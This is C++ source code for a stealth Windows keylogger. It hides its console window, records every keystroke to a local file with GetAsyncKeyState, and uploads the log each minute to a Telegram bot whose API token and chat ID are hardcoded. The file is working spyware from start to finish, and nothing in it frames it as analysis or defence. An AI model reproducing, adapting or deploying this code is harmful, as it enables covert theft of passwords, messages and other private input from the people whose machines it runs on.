#include<iostream>          // Input/output stream
#include<fstream>           // File stream
#include <Windows.h>        // Windows API
#include<WinUser.h>         // Windows User API
#include <stdlib.h>         // Standard library
#include <ctime>            // Time functions
#include <chrono>           // Chrono library for time measurement
#include<time.h>            // Time functions
#include <string>           // String manipulation
#include <sstream>          // String stream
#include <tchar.h>          // TCHAR library
#include <Lmcons.h>         // LAN Manager Constants
#include <cctype>           // Character types
#include <iomanip>          // Input/output manipulation
#include <curl/curl.h>      // libcurl library for HTTP requests
#include "cpr/cpr.h"        // cpr library for HTTP requests

using namespace std;

void StealthMode();         // Function prototype for hiding console window
void StartLogging();        // Function prototype for starting the logging process

const string LOGFILENAME = "Record.txt";                                      // Name of the log file
const string BOTAPI = "5598955707:AAEBvHDWPnpmwqHCG4sEFBlBb7vIwbCtGSo";      // Telegram Bot API token
const string CHAT_ID = "123456789";                                         // Telegram chat ID for sending messages
const double SENDING_FREQUENCY = 1.0;                                        // Frequency of sending log messages (in minutes)



string url_encode(string value) {
    //clearing shit
    for (int i = 0; i < value.size(); i++)
        if (value[i] < 32 || value[i]>127)value[i] = '▯';

    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
        string::value_type c = (*i);

        // Keep alphanumeric and other accepted characters intact
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        // Any other characters are percent-encoded
        escaped << uppercase;
        escaped << '%' << setw(2) << int((unsigned char)c);
        escaped << nouppercase;
    }

    return escaped.str();
}

void send() {
    ifstream ifs(LOGFILENAME);
    string input((std::istreambuf_iterator<char>(ifs)),
        (std::istreambuf_iterator<char>()));

    if (input.empty())return;
    bool success = true;

    while (!input.empty()) {
        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOTAPI + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(input.substr(0,4095)) });
        if (r.status_code != 200)success = false;
        
        input.erase(0, 4095);
    }
    if (success) {
        ofstream ofs;
        ofs.open(LOGFILENAME, ofstream::out | ofstream::trunc);
        ofs.close();
    }
}






LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
{
    
   
    StealthMode();      // Hiding the console window
    StartLogging();     // Starting the logging process


    return 0;
}

void StartLogging() {
    char c;
    auto start = std::chrono::system_clock::now();

    // Loop for capturing keystrokes and writing to the log file
    while(1) {
       
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {

                ofstream write("Record.txt", ios::app);

                if (((c > 64) && (c < 91)) && !(GetAsyncKeyState(0x10)))
                {
                    c += 32;
                    write << c;
                    write.close();
                    break;
                }
                else if ((c > 64) && (c < 91))
                {

                    write << c;
                    write.close();
                    break;
                }
                else {

                    switch (c)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << ")";
                        else
                            write << "0";


                    }
                    break;



                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "!";
                        else
                            write << "1";


                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "@";
                        else
                            write << "2";

                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "#";
                        else
                            write << "3";


                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "$";
                        else
                            write << "4";


                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "%";
                        else
                            write << "5";


                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "^";
                        else
                            write << "6";


                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "&";
                        else
                            write << "7";


                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "*";
                        else
                            write << "8";


                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))

                            write << "(";
                        else
                            write << "9";


                    }
                    break;

                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n";
                        break;
                    case VK_TAB:
                        write << "  ";
                        break;
                    case VK_BACK:
                        write << "<BACKSPACE>";
                        break;
                    case VK_DELETE:
                        write << "<Del>";
                        break;

                    default:
                        write << c;
                    }
                    auto end = std::chrono::system_clock::now();
                    std::chrono::duration<double> elapsed_seconds = end - start;
                    if (elapsed_seconds.count() / 60.0 >= SENDING_FREQUENCY) {
                        send();
                        
                        write << "sent";
                        start = end;

                    }

                }

            }
        }
      
        
    }
}
void StealthMode() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

}